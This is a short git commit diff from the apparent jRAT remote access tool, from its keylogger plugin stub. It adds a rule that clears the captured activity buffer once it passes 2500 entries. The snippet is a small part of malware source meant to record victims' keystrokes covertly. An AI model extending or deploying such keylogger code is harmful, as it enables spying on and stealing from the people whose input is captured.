8a2d7f6f409bdf68a4ace5e1a18fcb93b34e9d40
redpois0n <red@cmail.nu>
2013-09-14 00:04:08 +0200

    Keylogger 2500 actions buffer

--- Plugin Keylogger Stub/src/pro/jrat/plugin/stub/Activities.java
+++ Plugin Keylogger Stub/src/pro/jrat/plugin/stub/Activities.java
@@ -12,6 +12,11 @@ public class Activities {
 		if (activity instanceof Key && unix && activities.size() > 0 && ((Key)activities.get(activities.size() - 1)).getKey() == (((Key)activity).getKey())) {
 			//return;
 		}
+		
+		if (activities.size() > 2500) {
+			activities.clear();
+		}
+		
 		activities.add(activity);
 	}
 }
